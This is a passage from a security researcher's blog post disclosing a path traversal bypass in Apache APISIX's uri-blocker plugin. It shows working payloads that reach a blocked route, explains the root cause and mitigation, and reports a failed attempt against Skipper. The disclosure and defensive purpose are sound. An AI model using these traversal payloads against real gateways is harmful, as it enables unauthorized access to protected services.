+</span></span></code></pre></div><p>Yep. <code>public-service</code> is available and <code>protected-service</code> is blocked by plugin.</p><p>Now let&rsquo;s test payloads:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/public-service/../protected-service/protected&#34;</span>
+</span></span><span style=display:flex><span>Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#e6db74>&#34;protected data&#34;</span><span style=color:#f92672>}</span>
+</span></span></code></pre></div><p>and second one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/public-service/..%2Fprotected-service/protected&#34;</span>
+</span></span><span style=display:flex><span>Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#e6db74>&#34;protected data&#34;</span><span style=color:#f92672>}</span>
+</span></span></code></pre></div><p>As you can see in both cases I was able to bypass uri restrictions 😄</p><h3 id=root-cause>Root cause</h3><p><code>uri-blocker</code> plugin is using <code>ctx.var.request_uri</code> variable in logic of making blocking decision. You can check it in <a href=https://github.com/apache/apisix/blob/11e7824cee0e4ab0145ea7189d991464ade3682a/apisix/plugins/uri-blocker.lua#L98>code</a>:</p><figure><img src=https://user-images.githubusercontent.com/17719543/140750129-f32e9acc-2f4b-42d9-b565-d52d44fe0504.png></figure><h3 id=impact>Impact</h3><ul><li>attacker can bypass access control restrictions and perform successful access to routes that shouldn&rsquo;t be able to,</li><li>developers of custom plugins have no knowledge that <code>ngx.var.request_uri</code> variable is untrusted.</li></ul><p>Search for usage of <code>var.request_uri</code> gave me a hint that maybe <a href=https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/authz-keycloak.md>authz-keycloak plugin</a> is affected. You can see <a href=https://github.com/apache/apisix/blob/a3d42e66f60673e408cab2e2ceedc58aee450776/apisix/plugins/authz-keycloak.lua#L578>this code</a>, it looks really nasty. If there is no normalization on keycloak side, then there is high potential for vulnerablity.</p><h3 id=mitigation>Mitigation</h3><p>In case of custom plugins, I suggest to do path normalization before using <code>ngx.var.request_uri</code> variable. There are also two other variables, high probably normalized, to check <code>ctx.var.upstream_uri</code> and <code>ctx.var.uri</code>.</p><h2 id=skipper>Skipper</h2><p>Skipper is another ingress controller that I have investigated. It&rsquo;s not easy to install it in kubernetes, because deployment guide and helm charts are outdated. Luckily I have found issue page where developer was describing how to install it. This ingress gives possibility to implement external authentication based on <a href=https://opensource.zalando.com/skipper/reference/filters/#webhook>webhook filter</a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>networking.k8s.io/v1</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Ingress</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>my-ingress</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>annotations</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>zalando.org/skipper-filter</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      </span>      <span style=color:#ae81ff>modPath(&#34;^/.*/&#34;, &#34;/&#34;) -&gt; setRequestHeader(&#34;X-Auth-Request-Redirect&#34;, &#34;${request.path}&#34;) -&gt; webhook(&#34;http://auth-service.default.svc.cluster.local:8080/verify&#34;)</span>
+</span></span></code></pre></div><p>To add some interesting headers that could help in access control decision, you need to do it manually with <code>setRequestHeader</code> filter. There is template available to inject variable by <code>${}</code>. Sadly (for attackers) <code>${request.path}</code> is having normalized path 😐 I see in code that developers are not using <em>easily</em> <code>RequestURI</code> or <code>originalRequest</code>.</p><p>I wasn&rsquo;t able to exploit path traversal in this case. Skipper remains safe.</p><h2 id=summary>Summary</h2><p>Apache APISIX is vulnerable for path traversal. It&rsquo;s not affecting any external authentication, but plugins that are using <code>ctx.var.request_uri</code> variable.</p><p>Whole code of this example is here <a href=https://github.com/xvnpw/k8s-CVE-2021-43557-poc>https://github.com/xvnpw/k8s-CVE-2021-43557-poc</a>.</p><h3 id=other-articles-from-this-series>Other articles from this series</h3><ul><li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/>Path traversal in authorization context in Traefik and HAProxy</a></li><li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/>Path traversal in authorization context in Emissary</a></li><li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/>Path traversal in authorization context in Kong and F5 NGINX</a></li><li><a href=https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/>Bug bounty tips for nginx $request_uri path traversal bypass</a></li><li><a href=https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/>Hunting for buggy authentication/authorization services on github</a></li></ul><hr><p>Thanks for reading! You can follow me on <a href=https://twitter.com/xvnpw>Twitter</a>.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/kubernetes>kubernetes</a></li><li><a href=/tags/ingress>ingress</a></li><li><a href=/tags/apisix>apisix</a></li><li><a href=/tags/path-traversal>path-traversal</a></li></ul></nav></div></article></main><footer><hr><a class=soc href=https://github.com/xvnpw title=GitHub><i data-feather=github></i></a>|<a class=soc href=https://twitter.com/xvnpw title=Twitter><i data-feather=twitter></i></a>|⚡️
+2022 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></footer><script>feather.replace()</script></div></body></html>
